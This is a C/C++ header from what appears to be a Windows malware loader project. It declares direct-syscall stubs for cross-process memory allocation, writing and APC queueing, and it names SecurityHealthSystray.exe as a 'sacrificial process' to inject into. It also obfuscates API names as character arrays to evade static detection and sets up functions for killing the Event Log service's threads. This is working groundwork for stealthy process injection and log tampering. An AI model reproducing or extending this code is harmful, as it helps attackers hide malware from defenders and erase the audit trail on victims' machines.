#pragma once

#include "mystructs.h"

// Sacrificial Process to spawn
#define SPAWN "c:\\windows\\system32\\SecurityHealthSystray.exe"
//#define SPAWN "c:\\windows\\system32\\notepad.exe"

//#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions
//#pragma comment (lib,"Advapi32.lib")	//	For ServiceManager shit!

#define NT_SUCCESS(Status)	(((NTSTATUS)(Status)) >= 0)		// Macro defined in ntapi.h

// EventLog Flag Global Value => By-Default Assumes running
BOOL flag = TRUE;

// [link: https://www.codeproject.com/Questions/103661/how-to-get-current-Process-HANDLE]
// Return value of currentProcess() is a pseudo handle to the current process
// => (HANDLE)-1 => 0xFFFFFFFF" (MSDN)
#define MyCurrentProcess()	((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

EXTERN_C NTSTATUS sysNtAllocateVirtualMemory(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
);

EXTERN_C NTSTATUS sysNtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect
);


EXTERN_C NTSTATUS sysNtWriteVirtualMemory(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN SIZE_T                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten
);

EXTERN_C NTSTATUS sysNtOpenProcess(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
);

/*
EXTERN_C NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);
*/

/*
EXTERN_C NTSTATUS NtWaitForSingleObject(
	IN HANDLE         Handle,
	IN BOOLEAN        Alertable,
	IN PLARGE_INTEGER Timeout
);
*/

// For Usage of NtQueueApcThread Nt Api:

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		VOID* Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
	IN PVOID            ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG            Reserved
	);

EXTERN_C NTSTATUS sysNtQueueApcThread(

	HANDLE ThreadHandle,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcRoutineContext OPTIONAL,
	PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
	ULONG ApcReserved OPTIONAL
);

/*
// Code: https://evasions.checkpoint.com/techniques/timing.html
EXTERN_C NTSTATUS sysNtDelayExecution(
	IN BOOLEAN              Alertable,
	IN PLARGE_INTEGER       DelayInterval
);
*/

// Nt Function declarations:

NTSTATUS(*NtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);

NTSTATUS(*NtWriteVirtualMemory)(
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToRead,
	PULONG NumberOfBytesRead
	);

NTSTATUS(*NtProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID* BaseAddress,
	IN PSIZE_T NumberOfBytesToProtect,
	IN ULONG NewAccessProtection,
	OUT PULONG OldAccessProtection
	);

NTSTATUS(*NtOpenProcess)(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
	);

NTSTATUS(*NtQueueApcThread)(
	HANDLE ThreadHandle,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcRoutineContext OPTIONAL,
	PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
	ULONG ApcReserved OPTIONAL
	);


// Ntapi obfuscation:

// kernel32:
const char win32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };

// ntdll:
const char interfacedll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
//const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
//const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
//const char NtWrite[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
//const char NtCreateTh[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };
//const char NtWait[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0 };

//const char sNtOpenProcess[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s', 0 };

// sOpenProcess:
const char sOpenP[] = { 'O','p','e','n','P','r','o','c','e','s','s', 0 };

// sCreateProcessA:
const char sCrP[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A', 0 };

// sSuspendThread:
const char sSus[] = { 'S','u','s','p','e','n','d','T','h','r','e','a','d', 0 };
//const char sNtQueueApcThread[] = { 'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d', 0 };

// For EventLog Thread Kill

// sadvapi32_dll:
const char sadv[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0 };
const char sI_QueryTagInformation[] = { 'I','_','Q','u','e','r','y','T','a','g','I','n','f','o','r','m','a','t','i','o','n', 0 };
const char sNtQueryInformationThread[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','T','h','r','e','a','d', 0 };
//const char sOpenSCManagerA[] = { 'O','p','e','n','S','C','M','a','n','a','g','e','r','A', 0 };
//const char sOpenServiceA[] = { 'O','p','e','n','S','e','r','v','i','c','e','A', 0 };
//const char sQueryServiceStatusEx[] = { 'Q','u','e','r','y','S','e','r','v','i','c','e','S','t','a','t','u','s','E','x', 0 };
//const char sCreateToolhelp32Snapshot[] = { 'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t', 0 };
//const char sThread32First[] = { 'T','h','r','e','a','d','3','2','F','i','r','s','t', 0 };
//const char sThread32Next[] = { 'T','h','r','e','a','d','3','2','N','e','x','t', 0 };
//const char sTerminateThread[] = { 'T','e','r','m','i','n','a','t','e','T','h','r','e','a','d', 0 };

//const char sIsWow64Process[] = { 'I','s','W','o','w','6','4','P','r','o','c','e','s','s', 0 };
//const char sCloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e', 0 };

//const char sReadProcessMemory[] = { 'R','e','a','d','P','r','o','c','e','s','s','M','e','m','o','r','y', 0 };

// WinApi Obfuscation:

// ============================= For indirect.cpp + KillEventLog.h ===============================================================

// ============================= End: For indirect.cpp + KillEventLog.h ===============================================================

using I_QueryTagInformationPrototype = ULONG(WINAPI*)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
I_QueryTagInformationPrototype I_QueryTagInformation = (I_QueryTagInformationPrototype)GetProcAddress(GetModuleHandleA(sadv), sI_QueryTagInformation);

typedef NTSTATUS(WINAPI* NtQueryInformationThread_t)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
NtQueryInformationThread_t NtQueryInformationThread = (NtQueryInformationThread_t)GetProcAddress(GetModuleHandleA(interfacedll), sNtQueryInformationThread);

//using OpenSCManagerAPrototype = SC_HANDLE(WINAPI*)(LPCSTR, LPCSTR, DWORD);
//OpenSCManagerAPrototype OpenSCManagerA = (OpenSCManagerAPrototype)GetProcAddress(GetModuleHandleA(sadvapi32_dll), sOpenSCManagerA);

//using OpenServiceAPrototype = SC_HANDLE(WINAPI*)(SC_HANDLE, LPCSTR, DWORD);
//OpenServiceAPrototype OpenServiceA = (OpenServiceAPrototype)GetProcAddress(GetModuleHandleA(sadvapi32_dll), sOpenServiceA);

//using QueryServiceStatusExPrototype = BOOL(WINAPI*)(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD);
//QueryServiceStatusExPrototype QueryServiceStatusEx = (QueryServiceStatusExPrototype)GetProcAddress(GetModuleHandleA(sadvapi32_dll), sQueryServiceStatusEx);
